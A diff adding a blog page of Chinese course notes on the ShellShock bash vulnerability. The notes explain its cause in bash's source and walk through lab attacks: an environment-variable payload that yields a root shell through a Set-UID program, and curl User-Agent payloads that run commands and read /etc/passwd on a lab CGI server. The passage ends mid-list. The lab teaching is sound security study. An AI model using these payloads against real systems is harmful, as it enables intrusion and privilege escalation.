@@ -1,0 +1,481 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>03_《计算机安全导论：深度实践》第三章ShellShock | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hnu《软件安全测试》学习笔记  一、背景知识：shell函数1、shell命令解释器： shell程序有两种概念，一种命令解释器，一种指shell脚本。 命令解释器是交互式命令行解释器，允许用户与操作系统进行交互，执行命令，管理文件系统，启动程序等。 shell脚本是由shell脚本语言编写，由命令解释器解释执行的文本文件。   有多种命令解释器： Bourne Shell (sh)： 197">
+<meta property="og:type" content="article">
+<meta property="og:title" content="03_《计算机安全导论：深度实践》第三章ShellShock">
+<meta property="og:url" content="http://example.com/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="hnu《软件安全测试》学习笔记  一、背景知识：shell函数1、shell命令解释器： shell程序有两种概念，一种命令解释器，一种指shell脚本。 命令解释器是交互式命令行解释器，允许用户与操作系统进行交互，执行命令，管理文件系统，启动程序等。 shell脚本是由shell脚本语言编写，由命令解释器解释执行的文本文件。   有多种命令解释器： Bourne Shell (sh)： 197">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-10-17T09:08:55.000Z">
+<meta property="article:modified_time" content="2023-10-17T09:10:05.956Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="软件安全测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '03_《计算机安全导论：深度实践》第三章ShellShock',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-17 17:10:05'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">03_《计算机安全导论：深度实践》第三章ShellShock</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-10-17T09:08:55.000Z" title="Created 2023-10-17 17:08:55">2023-10-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-10-17T09:10:05.956Z" title="Updated 2023-10-17 17:10:05">2023-10-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="03_《计算机安全导论：深度实践》第三章ShellShock"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li>hnu《软件安全测试》学习笔记</li>
+</ul>
+<h1 id="一、背景知识：shell函数"><a href="#一、背景知识：shell函数" class="headerlink" title="一、背景知识：shell函数"></a>一、背景知识：shell函数</h1><h2 id="1、shell命令解释器："><a href="#1、shell命令解释器：" class="headerlink" title="1、shell命令解释器："></a>1、shell命令解释器：</h2><ul>
+<li>shell程序有两种概念，一种命令解释器，一种指shell脚本。<ul>
+<li>命令解释器是交互式命令行解释器，允许用户与操作系统进行交互，执行命令，管理文件系统，启动程序等。</li>
+<li>shell脚本是由shell脚本语言编写，由命令解释器解释执行的文本文件。</li>
+</ul>
+</li>
+<li>有多种命令解释器：<ul>
+<li>Bourne Shell (<strong>sh</strong>)：<ul>
+<li>1979年创建，是Unix的原始Shell。</li>
+<li>具有基本的命令解释功能，但功能有限，不常用。</li>
+</ul>
+</li>
+<li>C Shell (<strong>csh</strong>)：<ul>
+<li>20世纪80年代初创建。</li>
+<li>使用C语言风格的语法，包括C风格的控制结构。</li>
+<li>提供了更多的交互性和可用性。</li>
+</ul>
+</li>
+<li>Korn Shell (<strong>ksh</strong>)：<ul>
+<li>由David Korn创建，首次发布于1983年。</li>
+<li>Ksh结合了sh和csh的特点，提供了更多的功能和可用性。</li>
+<li>主要用于商业环境和一些大型Unix系统。</li>
+</ul>
+</li>
+<li>Bourne Again Shell (<strong>bash</strong>)：<ul>
+<li>1989年创建。</li>
+<li>Bash是Bourne Shell的增强版本，<strong>是目前大多数Linux系统的默认Shell，最常用</strong>。</li>
+<li>具有丰富的功能，包括命令历史记录、自动补全、脚本编程等。</li>
+</ul>
+</li>
+<li>Z Shell (<strong>zsh</strong>)：<ul>
+<li>首次发布于1990年。</li>
+<li>提供高度定制、自动补全、插件支持等功能。</li>
+<li>在用户友好性和交互性方面非常强大，被广泛用于Shell爱好者和开发者之间。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>bash是使用最广泛的shell程序，bash中的shellshock漏洞主要与shell函数有关。</li>
+</ul>
+<h2 id="2、shell函数："><a href="#2、shell函数：" class="headerlink" title="2、shell函数："></a>2、shell函数：</h2><ul>
+<li>在shell命令解释器中的shell函数：<ul>
+<li>定义：函数名(){ 函数体 }，语法遵循shell编程语言</li>
+<li>调用：直接使用函数名</li>
+<li>查看函数定义：declare -f 函数名</li>
+<li>撤销函数：unset -f 函数名</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310071522577.png" alt="image-20231007152250424"></p>
+<ul>
+<li>将父进程定义的shell函数传递给子进程：</li>
+<li>第一种方法，父shell定义函数后，直接使用export：export -f 函数名，此时子shell便可以使用函数</li>
+<li>第二种方法，父进程定义<strong>特殊内容</strong>的shell变量：<ul>
+<li>父进程（不要求一定是shell进程）定义export foo&#x3D;’() { echo “hello world”; }’  ，注意左大括号前后都要有空格</li>
+<li>显然由于单引号，父shell中的foo不是函数，而是一个字符串变量</li>
+<li>但是此时在子shell中分别进行foo变量和foo函数的使用，发现foo被识别为函数。</li>
+</ul>
+</li>
+<li>shell中单双引号的区别：<ul>
+<li>无引号的字符串是最简单的形式，Shell 会将字符串按照空格和特定的分隔符（通常是空格等）进行分割，然后将其视为多个参数。</li>
+<li>单引号用于创建强引用字符串，其中的内容被视为纯文本，不会被解释或扩展。单引号内的特殊字符和变量不会被替换。</li>
+<li>双引号用于创建弱引用字符串，其中的变量和转义字符会被解释和扩展。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091221834.png" alt="image-20231009122131804"></p>
+<ul>
+<li><p>第二种原理：</p>
+<ul>
+<li>shell变量被export标记时会当做环境变量传递给子进程</li>
+<li>当子进程本是就是shell程序，不仅接收父进程的环境变量，还会将环境变量转换成相同的shell变量</li>
+<li>转换过程发现以括号()开头的环境变量，于是转换成一个shell函数，而非shell变量</li>
+</ul>
+</li>
+<li><p>直接使用系统的bash测试第二种，发现无效，因为默认的bash已经打了补丁，不受shellshock影响：</p>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091057514.png" alt="image-20231009105746473"></p>
+<ul>
+<li>尝试使用教材提及的，未打补丁的bash_shellshock，发现并不存在，应该只有Ubuntu16.04有</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091108217.png" alt="image-20231009110817183"></p>
+<ul>
+<li>安装Ubuntu16.04</li>
+</ul>
+<h1 id="二、ShellShock漏洞："><a href="#二、ShellShock漏洞：" class="headerlink" title="二、ShellShock漏洞："></a>二、ShellShock漏洞：</h1><ul>
+<li>bash中的安全漏洞，被称为ShellShock或者bashdoor，主要原因是bash处理环境变量为shell函数定义时犯得错误。</li>
+<li>最早于2014年9月24日被公开，编号CVE-2014-6271。</li>
+<li>原始漏洞被发现后，又发现一些类似的安全漏洞，统称为ShellShock漏洞。</li>
+</ul>
+<h2 id="1、漏洞描述："><a href="#1、漏洞描述：" class="headerlink" title="1、漏洞描述："></a>1、漏洞描述：</h2><ul>
+<li>当子shell进程将某些环境变量转换成shell函数时，由于解析逻辑的漏洞，<strong>不仅会解析变量中的指令，可能还会执行变量中的指令</strong>。</li>
+<li>测试漏洞</li>
+<li>父进程定义：export foo&#x3D;’() { echo “hello world”;}; echo “shellshock”; echo $$’  ，即函数结束后，使用分号，又加上了其他指令</li>
+<li>启动bash_shellshock<ul>
+<li>发现自动执行了加上的指令，其中echo $$打印的0，说明应该子进程执行的？</li>
+<li>父进程pid&#x3D;2519，子进程pid&#x3D;2612</li>
+<li>并且在子shell进程中打印shell函数，发现没有后面加上的额外指令</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091316814.png" alt="image-20231009131608783"></p>
+<h2 id="2、bash的源码错误："><a href="#2、bash的源码错误：" class="headerlink" title="2、bash的源码错误："></a>2、bash的源码错误：</h2><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091321515.png" alt="image-20231009132148456"></p>
+<ul>
+<li>源码variables.c文件中，bash进程在环境变量中找到值以<code>() &#123;</code>开头时，会触发解析逻辑</li>
+<li>代码1中，检测环境变量的值是否以<code>() &#123;</code>开头，若是则将原本环境变量中字符串的&#x3D;替换成空格，即由”foo&#x3D;() {}”变为”foo (){}”从而得到shell函数定义的字符串。</li>
+<li>代码2中，使用parse_and_execute函数解析前面得到的shell函数定义字符串，parse_and_execute函数功能强大，不仅可以解析函数定义，还可以解析和执行shell指令。</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091330742.png" alt="image-20231009133022704"></p>
+<ul>
+<li>当shell函数定义使用了;分隔时，parse_and_execute函数会识别为多个shell指令，第一个为定义shell函数的shell指令，其余的则可以是任意指令、</li>
+<li>parse_and_execute函数本质上是从字符串中识别shell指令，然后执行shell指令。正常情况下得到的是函数定义的shell指令，所以可以完成将环境变量转成函数定义的功能。但是又不仅识别一条指令，所以导致了shellshock</li>
+</ul>
+<h2 id="3、shellshock漏洞利用："><a href="#3、shellshock漏洞利用：" class="headerlink" title="3、shellshock漏洞利用："></a>3、shellshock漏洞利用：</h2><ul>
+<li>两个条件：<ul>
+<li>目标进程运行bash</li>
+<li>攻击者能通过环境变量向目标进程传递数据</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091334907.png" alt="image-20231009133459847"></p>
+<h1 id="三、攻击Set-UID程序："><a href="#三、攻击Set-UID程序：" class="headerlink" title="三、攻击Set-UID程序："></a>三、攻击Set-UID程序：</h1><ul>
+<li>当Set-UID程序通过system函数调用外部程序时，可以设置环境变量进行shellshock进行攻击。</li>
+<li>shellshockSystem.c函数，编译，设为root的Set-UID程序</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setuid(geteuid());<span class="comment">//功能是修改RUID为EUID，可能不同参数会有不同效果</span></span><br><span class="line">    system(<span class="string">&quot;/bin/ls -l&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091746544.png" alt="image-20231009174644486"></p>
+<ul>
+<li>设置环境变量：export foo&#x3D;’() { echo “hello world”;}; &#x2F;bin&#x2F;sh;’</li>
+<li>设置软连接：sudo ln -sf &#x2F;bin&#x2F;bash_shellshock &#x2F;bin&#x2F;sh，改回原连接：sudo ln -cf &#x2F;bin&#x2F;dash &#x2F;bin&#x2F;sh</li>
+<li>执行shellshockSystem，发现获得的只是seed的shell</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091749350.png" alt="image-20231009174922317"></p>
+<ul>
+<li>发现问题原因，geteuid写成了getuid，修正后再次测试，成功得到root的shell</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091814859.png" alt="image-20231009181457831"></p>
+<ul>
+<li>说明setuid(geteuid())能将RUID也设为root，能改变进程RUID还是比较神奇的</li>
+<li>setuid(uid)执行的情况：《UNIX环境高级编程》<ul>
+<li>若进程具有超级用户权限即root，则setuid将RUID、EUID、SUID设置为uid</li>
+<li>若进程没有超级用户权限，但uid等于RUID或SUID，则setuid只将EUID设置为uid，不改变RUID和SUID</li>
+<li>若以上条件不满足，返回-1，errno设为EPERM</li>
+</ul>
+</li>
+</ul>
+<h1 id="四、攻击CGI程序："><a href="#四、攻击CGI程序：" class="headerlink" title="四、攻击CGI程序："></a>四、攻击CGI程序：</h1><h2 id="1、CGI程序："><a href="#1、CGI程序：" class="headerlink" title="1、CGI程序："></a>1、CGI程序：</h2><ul>
+<li><p>CGI（Common Gateway Interface）是一种用于在Web服务器和应用程序之间传递信息的标准协议。</p>
+</li>
+<li><p>CGI程序是一种用于Web服务器的脚本或可执行程序</p>
+<ul>
+<li>Web服务器接收到用户客户端的http请求（需要CGI程序处理的请求）</li>
+<li>Web服务器<strong>启动CGI程序的一个新进程</strong></li>
+<li>Web服务器将http请求的参数传递给该CGI进程</li>
+<li>CGI程序进行处理（生成动态网页或者其他操作），将内容返回给Web服务器</li>
+<li>Web服务器再将内容发送给用户客户端。</li>
+</ul>
+</li>
+<li><p>编写语言：CGI程序可以使用各种编程语言编写，包括但不限于Perl、Python、C、C++、Shell脚本等。这些程序通常根据特定的请求生成HTML页面、处理表单数据、与数据库交互等。</p>
+</li>
+<li><p>URL路径：CGI程序通常<strong>通过URL的路径来调用</strong>，例如 <code>http://example.com/cgi-bin/mycgi.pl</code>，其中 <code>/cgi-bin/</code> 是Web服务器配置的CGI脚本目录，<code>mycgi.pl</code> 是CGI程序的文件名。</p>
+</li>
+<li><p>安全性考虑：由于CGI程序可以<strong>执行任意代码</strong>，因此必须非常小心，以确保安全性。不正确的CGI程序可能会导致安全漏洞，因此开发和配置CGI程序需要遵循安全最佳实践。</p>
+</li>
+<li><p>尽管CGI在过去非常流行，但它已经被更高效和更安全的技术取代，例如服务器端脚本语言（如PHP、Python、Node.js）和Web框架。这些技术通常可以更有效地处理HTTP请求和生成动态内容，而<strong>无需像CGI那样启动新的进程</strong>。</p>
+</li>
+<li><p>以下是一些区分服务器端脚本语言和CGI程序的关键区别：</p>
+<ol>
+<li><strong>执行方式</strong>：<ul>
+<li><strong>CGI程序</strong>：每次接收到HTTP请求时，Web服务器都会启动一个新的进程来运行CGI程序。</li>
+<li><strong>服务器端脚本语言</strong>：通常以持久化的方式运行在Web服务器内部，例如作为一个模块或一个进程池的一部分。它们可以处理多个请求，而不需要在每次请求时启动新的进程。</li>
+</ul>
+</li>
+<li><strong>资源共享</strong>：<ul>
+<li><strong>CGI程序</strong>：每个CGI请求都在独立的进程中运行，不容易共享数据或状态。</li>
+<li><strong>服务器端脚本语言</strong>：它们通常可以更容易地共享状态和数据，因为它们可以在持久化的环境中运行。</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p>使用shell脚本实现CGI程序：</p>
+<ul>
+<li>Web服务器会接受CGI标准输出的内容，作为响应客户端的内容，主要是响应头和响应体</li>
+<li>响应头与响应体使用空行区分即可</li>
+<li>标准输出使用echo即可</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置 HTTP 响应头</span></span><br><span class="line">echo &quot;Content-type: text/html&quot;</span><br><span class="line">echo &quot;&quot;  # 空行表示响应头的结束</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送 HTML 页面内容即响应体</span></span><br><span class="line">echo &quot;&lt;html&gt;&quot;</span><br><span class="line">echo &quot;&lt;head&gt;&quot;</span><br><span class="line">echo &quot;&lt;title&gt;CGI Example&lt;/title&gt;&quot;</span><br><span class="line">echo &quot;&lt;/head&gt;&quot;</span><br><span class="line">echo &quot;&lt;body&gt;&quot;</span><br><span class="line">echo &quot;&lt;h1&gt;Hello, CGI World!&lt;/h1&gt;&quot;</span><br><span class="line">echo &quot;&lt;/body&gt;&quot;</span><br><span class="line">echo &quot;&lt;/html&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2、实验环境测试："><a href="#2、实验环境测试：" class="headerlink" title="2、实验环境测试："></a>2、实验环境测试：</h2><ul>
+<li><p>两台虚拟机</p>
+<ul>
+<li>目标服务器需要存在shellshock漏洞，使用Seed的Ubuntu16.04（10.0.2.4），已经安装好Apache&#x2F;2.4.18 (Ubuntu)</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091907229.png" alt="image-20231009190734200"></p>
+<ul>
+<li>攻击机只需要能进行网络访问和接收shell，使用Ubuntu20.04（10.0.2.15）</li>
+<li>若是发现两台机器ip一样，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51153463/article/details/123966124">https://blog.csdn.net/qq_51153463/article/details/123966124</a></li>
+</ul>
+</li>
+<li><p>目标服务器编写test.cgi，放在Apache服务器的默认CGI目录&#x2F;usr&#x2F;lib&#x2F;cgi-bin&#x2F;目录下，用户为root，权限755</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash_shellshock</span></span><br><span class="line"></span><br><span class="line">echo &quot;Cotent-type:text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo &quot;hello world&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091913013.png" alt="image-20231009191347984"></p>
+<ul>
+<li>检测目标服务器apache状态sudo systemctl status apache2</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091931792.png" alt="image-20231009193122762"></p>
+<ul>
+<li>攻击机curl命令，发送http请求：curl <a target="_blank" rel="noopener" href="http://10.0.2.4/cgi-bin/test.cgi%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%88%90%E5%8A%9F%E8%BF%94%E5%9B%9E%E4%BA%86">http://10.0.2.4/cgi-bin/test.cgi，发现成功返回了</a></li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091935453.png" alt="image-20231009193549419"></p>
+<h2 id="3、调用CGI程序流程："><a href="#3、调用CGI程序流程：" class="headerlink" title="3、调用CGI程序流程："></a>3、调用CGI程序流程：</h2><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091938504.png" alt="image-20231009193840435"></p>
+<ul>
+<li>Web服务器会判断请求是否是CGI请求（根据url是否是CGI程序路径？）</li>
+<li>是，则fork一个子进程，使用exec函数族，载入CGI程序</li>
+<li>因为CGI程序是shell脚本语言，开头的若是#!&#x2F;bin&#x2F;bash，则exec实际上执行了&#x2F;bin&#x2F;bash，再由bash进程解析shell指令，<strong>此时符合条件一，触发bash</strong></li>
+<li>Apache服务器fork子进程时，再通过exec调用bash时，均有<strong>环境变量传递，符合条件二</strong></li>
+<li>探明传递的环境变量，testEnv.cgi，进行相应权限设置</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash_shellshock</span></span><br><span class="line">echo &quot;Cotent-type:text/plain&quot;</span><br><span class="line">echo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">响应体内容</span></span><br><span class="line">echo &quot;环境变量如下&quot;</span><br><span class="line">strings /proc/$$/environ</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091951741.png" alt="image-20231009195125715"></p>
+<ul>
+<li>攻击机访问：curl <a target="_blank" rel="noopener" href="http://10.0.2.4/cgi-bin/testEnv.cgi%EF%BC%8C%E6%88%90%E5%8A%9F%E5%93%8D%E5%BA%94">http://10.0.2.4/cgi-bin/testEnv.cgi，成功响应</a></li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091955043.png" alt="image-20231009195530018"></p>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310091956814.png" alt="image-20231009195631784"></p>
+<ul>
+<li>观察curl的请求头和返回的响应体中的环境变量：有多处有相同的值，但是考虑到http的正常通信，User-Agent是最适合作为攻击点的，也可以寻找其他不影响通信的参数。</li>
+</ul>
+<h2 id="4、实施shellshock攻击："><a href="#4、实施shellshock攻击：" class="headerlink" title="4、实施shellshock攻击："></a>4、实施shellshock攻击：</h2><ul>
+<li>正常的CGI程序，normal.cgi</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash_shellshock</span></span><br><span class="line">echo &quot;Test:正常的请求头&quot;</span><br><span class="line">echo ;</span><br><span class="line">echo &quot;正常的请求体&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092008638.png" alt="image-20231009200817608"></p>
+<ul>
+<li>curl命令，使用-A参数，可以设置User-Agent的值，执行shellshock只需要设为：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;() &#123; echo hello;&#125;;echo Cotent-type:text/plain;echo;/bin/ls -l;&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>测试ls -l命令：curl -v -A “() { echo hello;};echo Cotent-type:text&#x2F;plain;echo;&#x2F;bin&#x2F;ls -l;whoami;” <a target="_blank" rel="noopener" href="http://10.0.2.4/cgi-bin/normal.cgi">http://10.0.2.4/cgi-bin/normal.cgi</a></li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092010571.png" alt="image-20231009201021529"></p>
+<ul>
+<li>在响应体中，正常打印了ls -l执行的结果，但是并没有看到正常CGI程序的内容。</li>
+<li>测试whoami或者id指令，发现没有结果，先重定向到tmp，再cat也没用。（<strong>补：没有内容的原因是没有指明路径，应该&#x2F;bin&#x2F;whoami或者&#x2F;bin&#x2F;id</strong>）</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092023361.png" alt="image-20231009202359333"></p>
+<ul>
+<li>测试读取密码，发现&#x2F;etc&#x2F;shadow不可读，&#x2F;etc&#x2F;passwd可以</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092025929.png" alt="image-20231009202552901"></p>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310092026560.png" alt="image-20231009202609533"></p>
+<ul>
